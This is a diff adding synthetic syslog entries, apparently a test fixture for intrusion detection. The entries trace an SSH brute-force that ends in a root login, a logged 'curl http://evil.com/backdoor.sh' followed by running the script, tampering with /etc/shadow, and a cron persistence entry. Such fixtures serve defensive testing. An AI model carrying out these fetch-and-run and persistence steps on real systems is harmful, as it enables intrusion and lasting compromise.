@@ -1,0 +1,18 @@
+<134>1 2025-03-15T10:00:01Z fw-edge-01 pf - - - pass in on em0: 10.0.0.100.49152 > 8.8.8.8.53: UDP, length 64
+<134>1 2025-03-15T10:00:05Z fw-edge-01 pf - - - block in on em0: 203.0.113.45.12345 > 10.0.0.5.22: TCP SYN
+<134>1 2025-03-15T10:00:06Z fw-edge-01 pf - - - block in on em0: 203.0.113.45.12346 > 10.0.0.5.22: TCP SYN
+<134>1 2025-03-15T10:00:07Z fw-edge-01 pf - - - block in on em0: 203.0.113.45.12347 > 10.0.0.5.22: TCP SYN
+<134>1 2025-03-15T10:00:08Z fw-edge-01 pf - - - block in on em0: 203.0.113.45.12348 > 10.0.0.5.22: TCP SYN
+<134>1 2025-03-15T10:00:09Z fw-edge-01 pf - - - block in on em0: 203.0.113.45.12349 > 10.0.0.5.22: TCP SYN
+<130>1 2025-03-15T10:01:00Z dc01 sshd 4521 - - Failed password for root from 203.0.113.45 port 52001 ssh2
+<130>1 2025-03-15T10:01:01Z dc01 sshd 4522 - - Failed password for root from 203.0.113.45 port 52002 ssh2
+<130>1 2025-03-15T10:01:02Z dc01 sshd 4523 - - Failed password for root from 203.0.113.45 port 52003 ssh2
+<130>1 2025-03-15T10:01:03Z dc01 sshd 4524 - - Failed password for root from 203.0.113.45 port 52004 ssh2
+<130>1 2025-03-15T10:01:04Z dc01 sshd 4525 - - Failed password for root from 203.0.113.45 port 52005 ssh2
+<130>1 2025-03-15T10:01:05Z dc01 sshd 4526 - - Failed password for root from 203.0.113.45 port 52006 ssh2
+<130>1 2025-03-15T10:01:10Z dc01 sshd 4527 - - Accepted password for root from 203.0.113.45 port 52010 ssh2
+<134>1 2025-03-15T10:02:00Z dc01 sudo 4600 - - root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl http://evil.com/backdoor.sh
+<134>1 2025-03-15T10:02:30Z dc01 sudo 4601 - - root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash /tmp/backdoor.sh
+<131>1 2025-03-15T10:03:00Z webserver01 kernel - - - possible SYN flood from 198.51.100.0/24, sending cookies
+<131>1 2025-03-15T10:03:30Z dc01 auditd 100 - - ALERT: Unauthorized modification of /etc/shadow by UID 0
+<131>1 2025-03-15T10:04:00Z dc01 auditd 101 - - ALERT: New crontab entry added by root: */5 * * * * /tmp/backdoor.sh
